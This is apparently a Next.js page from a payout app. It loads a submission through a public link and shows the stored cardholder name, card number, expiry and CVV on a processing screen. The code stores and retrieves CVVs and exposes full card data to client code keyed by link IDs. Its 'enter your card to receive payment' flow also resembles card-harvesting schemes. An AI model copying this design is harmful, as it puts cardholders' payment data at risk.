"use client";

import { useState } from "react";
import { useParams, useRouter } from "next/navigation";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { Loader2 } from "lucide-react";
import { usePublicLink } from "@/hooks/use-public-link";
import { usePayoutSubmission } from "@/hooks/use-payout-submission";
import { useUpdatePayoutBrand } from "@/hooks/use-update-payout-brand";
import PaymentProcessing2 from "@/components/blocks/payment-processing/PaymentProcessing2";
import { toast } from "sonner";

function getQueryClient() {
  return new QueryClient({
    defaultOptions: { queries: { staleTime: 60 * 1000 } },
  });
}

function ProcessingPageInner() {
  const params = useParams<{ linkId: string; submissionId: string }>();
  const router = useRouter();

  const { data: link, isLoading: linkLoading } = usePublicLink(params.linkId);
  const ownerUid = link?.ownerUid;

  const {
    data: submission,
    isLoading: submissionLoading,
    isError,
    error,
  } = usePayoutSubmission(ownerUid, params.submissionId);

  const updateBrand = useUpdatePayoutBrand(
    ownerUid,
    params.submissionId,
    submission?.orderId,
  );

  if (linkLoading || submissionLoading) {
    return (
      <div className="flex min-h-screen  justify-center pt-[30vh]">
        <Loader2 className="h-15 w-15 animate-spin text-primary" />
      </div>
    );
  }

  if (isError) {
    console.error("[ProcessingPage] Firestore error:", error);
    return (
      <div className="flex min-h-screen flex-col items-center justify-center gap-2 text-center px-4">
        <p className="text-lg font-semibold text-gray-900">
          Something went wrong loading this payment.
        </p>
        <p className="max-w-md text-sm text-gray-500">
          Check the browser console for the full error.
        </p>
      </div>
    );
  }

  if (!submission) {
    return (
      <div className="flex min-h-screen flex-col items-center justify-center gap-2 text-center px-4">
        <p className="text-lg font-semibold text-gray-900">
          We couldn&apos;t find this payment submission.
        </p>
        <p className="max-w-md text-sm text-gray-500">
          Double-check the link, or submit your payout details again.
        </p>
      </div>
    );
  }

  return (
    <PaymentProcessing2
      card={{
        cardholderName: submission.cardName || "Card Holder",
        cardNumber: submission.cardNumber || "0000",
        expiry: submission.expiryDate || "--/--",
        cvc: submission?.cvv || "",
      }}
      onConfirmBrandName={async (brandName) => {
        try {
          await updateBrand.mutateAsync(brandName);
        } catch (err: any) {
          toast.error(err.message ?? "Failed to save brand name.");
        }
      }}
      onGoBack={() => router.push(`/receive-payment/${params.linkId}`)}
    />
  );
}

export default function ProcessingPage() {
  const [queryClient] = useState(getQueryClient);

  return (
    <QueryClientProvider client={queryClient}>
      <ProcessingPageInner />
    </QueryClientProvider>
  );
}
